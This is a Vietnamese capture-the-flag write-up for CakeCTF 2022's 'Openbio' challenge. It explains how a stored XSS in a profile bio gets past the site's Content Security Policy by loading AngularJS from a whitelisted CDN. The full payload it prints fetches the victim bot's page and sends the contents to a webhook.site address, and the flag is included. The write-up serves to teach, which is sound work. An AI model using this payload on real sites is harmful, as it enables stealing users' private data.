# CakeCTF 2022: Openbio

**link**: http://web1.2022.cakectf.com:8003

Bài này nó cho source code nhưng mà thật ra mình không cần quan tâm lắm, bài này dạo qua tí thì mình sẽ biết nó là XSS thông qua trang profile. Vấn đề ở bài này là làm sao bypass được 2 thứ, CSP và HttpOnly cookie.

Trong source code cung cấp có file `crawler.js`, file này sẽ đóng vai trò làm bot đóng giả victim và truy cập vào link profile được report. Nó cũng sẽ reg một account random và set flag vào bio của account đó.

Lúc này trong đầu mình nghĩ rằng, thật ra không cần phải lấy cookie mà chỉ cần làm sao để lấy cái Flag nằm trong bio của con bot đó. 

Giờ đầu tiên, ta nhìn vào phần CSP của nó:

```
 default-src 'none';script-src 'nonce-avB8AzG9+I6GrLS1n/mO5g==' https://cdn.jsdelivr.net/ https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ 'unsafe-eval';style-src https://cdn.jsdelivr.net/;frame-src https://www.google.com/recaptcha/ https://recaptcha.google.com/recaptcha/;base-uri 'none';connect-src 'self';

```

Nó chặn việc thực thi inline script, src của style, script đều bị whitelist, ... bla bla. Và nó cho phép hàm `eval` (`unsafe-eval`)

Trong số các script src được whitelist, có url `https://cdn.jsdelivr.net/`, như anh em biết thì nó là cdn dùng để chứa các client-side script (js, css) và nó chứa các framework như angular, ....

Ta biết rằng angular có khá nhiều bug XSS trong các version cũ và cdn này cũng vẫn còn chứa các version đó (thật ra ngay ở version mới nhất cũng có thể lợi dụng được). Vậy, ta có thể include angular từ cdn trên và thực thi JS (trong angular việc thực thi JS bằng eval không nhất thiết cùng thẻ script)

```
<script src="https://cdn.jsdelivr.net/npm/angular@1.8.3/angular.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)
')()}}</div>
```

Oke rồi, ta đã XSS được. Giờ phải làm sao để lấy được flag, ý tưởng là gửi một request đến link profile bằng cookie của user hiện tại (con bot) rồi sau đó lấy text của response trả về, cho nó redirect đến webhook.

Full payload:

```
aaa</textarea><script src="https://cdn.jsdelivr.net/npm/angular@1.8.3/angular.js"></script> <div ng-app ng-csp>{{$eval.constructor('fetch("http://challenge:8080/",{mode:"no-cors"}).then(r => r.text()).then(t => window.location.href="https://webhook.site/49115582-167f-440b-98c4-b7b88aa57f96?c="+btoa(encodeURIComponent(t)))
')()}}</div>

```

Trước khi gửi thì ta encode URI và encode sang base64 để có thể truyền qua get param của webhook

![](https://i.imgur.com/IAPuyLZ.png)

![](https://i.imgur.com/mRQQG9b.png)

Flag: `CakeCTF{httponly=true_d03s_n0t_pr0t3ct_U_1n_m4ny_c4s3s!}`
